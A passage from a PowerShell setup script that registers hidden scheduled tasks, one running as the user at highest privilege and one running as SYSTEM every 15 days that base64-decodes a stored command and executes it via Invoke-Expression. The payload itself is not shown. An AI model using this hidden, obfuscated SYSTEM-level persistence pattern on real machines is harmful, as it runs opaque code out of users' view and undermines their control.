            $jtbjkTrigger.Delay = 'PT3M'

            $jtbjkPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

            $jtbjkSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            try {
                Register-ManagedTask -TaskName $jtbjkTaskName -Action $jtbjkAction -Trigger $jtbjkTrigger -Principal $jtbjkPrincipal -Settings $jtbjkSettings
                Enable-ScheduledTask -TaskPath '\' -TaskName $jtbjkTaskName -ErrorAction Stop | Out-Null
                Start-ScheduledTask -TaskPath '\' -TaskName $jtbjkTaskName -ErrorAction Stop
            } catch {
                Write-Warning "Task '$jtbjkTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
            }
        } else {
            Unregister-ScheduledTask -TaskPath '\' -TaskName $jtbjkTaskName -Confirm:$false -ErrorAction SilentlyContinue
        }

        $systemAutoSetupTask = Get-ScheduledTask -TaskName 'sshAutoSetup' -ErrorAction SilentlyContinue |
            Where-Object {
                $_.Principal.UserId -ieq 'SYSTEM' -and
                $_.Principal.LogonType -eq 'ServiceAccount'
            } |
            Select-Object -First 1

        if ($systemAutoSetupTask) {
            Unregister-ScheduledTask -TaskPath '\' -TaskName $autoupgradeTaskName -Confirm:$false -ErrorAction SilentlyContinue
        } else {
            $autoupgradeCommand = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$ENCODED_EC')) | Invoke-Expression"
            $autoupgradeAction = New-PowerShellTaskAction -Command $autoupgradeCommand

            $autoupgradeTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 15 -At 11pm
            $autoupgradeTrigger.Enabled = $true

            $autoupgradePrincipal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest

            $autoupgradeSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            try {
                Register-ManagedTask -TaskName $autoupgradeTaskName -Action $autoupgradeAction -Trigger $autoupgradeTrigger -Principal $autoupgradePrincipal -Settings $autoupgradeSettings
                Enable-ScheduledTask -TaskPath '\' -TaskName $autoupgradeTaskName -ErrorAction Stop | Out-Null
                Start-ScheduledTask -TaskPath '\' -TaskName $autoupgradeTaskName -ErrorAction Stop
            } catch {
                Write-Warning "Task '$autoupgradeTaskName' installation/start failed: $($_.Exception.Message)" -WarningAction Continue
            }
        }
    }
} catch {
    Write-Warning "Task setup failed: $($_.Exception.Message)" -WarningAction Continue
}

$PSDefaultParameterValues.Clear()
foreach ($key in $originalPSDefaults.Keys) {
    $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
}
